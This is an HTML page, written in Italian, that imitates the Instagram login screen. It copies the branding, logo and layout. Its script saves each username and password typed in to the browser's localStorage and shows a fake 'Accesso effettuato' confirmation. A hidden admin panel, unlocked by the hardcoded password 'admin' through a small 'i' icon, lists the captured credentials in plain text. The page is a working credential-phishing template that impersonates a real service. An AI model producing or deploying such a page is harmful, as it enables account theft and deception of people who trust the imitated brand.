<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>

<link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">

<style>
body {
    margin: 0;
    background: #fafafa;
    font-family: system-ui, -apple-system, BlinkMacSystemFont,
                 "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

/* CENTRO PAGINA */
.page {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

/* CONTAINER GRANDE */
.container {
    display: flex;
    gap: 50px;
    align-items: center;
}

/* MOCKUP TELEFONO */
.phone {
    width: 380px;
    height: 580px;
    background: url('https://i.imgur.com/Zy0Xh5K.png');
    background-size: cover;
    border-radius: 30px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
}

/* BOX LOGIN */
.box {
    width: 350px;
    background: white;
    border: 1px solid #dbdbdb;
    padding: 40px;
    text-align: center;
}

.logo {
    font-family: 'Billabong', cursive;
    font-size: 55px;
    margin-bottom: 25px;
}

input {
    width: 100%;
    padding: 10px;
    margin: 6px 0;
    border: 1px solid #dbdbdb;
    background: #fafafa;
    border-radius: 5px;
    font-size: 13px;
}

button {
    width: 100%;
    padding: 10px;
    margin-top: 10px;
    background: #0095f6;
    border: none;
    color: white;
    font-weight: 600;
    border-radius: 8px;
    cursor: pointer;
}

button:hover {
    background: #1877f2;
}

/* LINK SOTTO */
.small {
    font-size: 12px;
    color: #999;
    margin-top: 15px;
}

/* ADMIN PANEL */
.admin {
    width: 350px;
    margin-top: 20px;
    background: white;
    border: 1px solid #dbdbdb;
    padding: 15px;
    display: none;
}

/* ICONA INFO */
.info {
    position: fixed;
    bottom: 10px;
    right: 10px;
    font-size: 14px;
    color: #999;
    cursor: pointer;
}
</style>
</head>

<body>

<div class="page">

<div class="container">

    <!-- TELEFONO MOCKUP -->
    <div class="phone"></div>

    <!-- LOGIN BOX -->
    <div>
        <div class="box">
            <div class="logo">Instagram</div>

            <input id="user" type="text" placeholder="Telefono, username o email">
            <input id="pass" type="password" placeholder="Password">

            <button onclick="login()">Accedi</button>

            <div class="small">Password dimenticata?</div>
        </div>

        <div class="admin" id="adminPanel">
            <h3>Admin</h3>
            <ul id="lista"></ul>
        </div>
    </div>

</div>

</div>

<div class="info" onclick="askAdmin()">i</div>

<script>
function login() {
    let user = document.getElementById("user").value;
    let pass = document.getElementById("pass").value;

    let dati = JSON.parse(localStorage.getItem("logins")) || [];

    dati.push({user, pass});

    localStorage.setItem("logins", JSON.stringify(dati));

    update();

    alert("Accesso effettuato");
}

function update() {
    let lista = document.getElementById("lista");
    lista.innerHTML = "";

    let dati = JSON.parse(localStorage.getItem("logins")) || [];

    dati.forEach(d => {
        let li = document.createElement("li");
        li.textContent = d.user + " | " + d.pass;
        lista.appendChild(li);
    });
}

function askAdmin() {
    let pw = prompt("Password admin:");

    if (pw === "admin") {
        document.getElementById("adminPanel").style.display = "block";
        update();
    } else {
        alert("Password errata");
    }
}

window.onload = update;
</script>

</body>
</html>
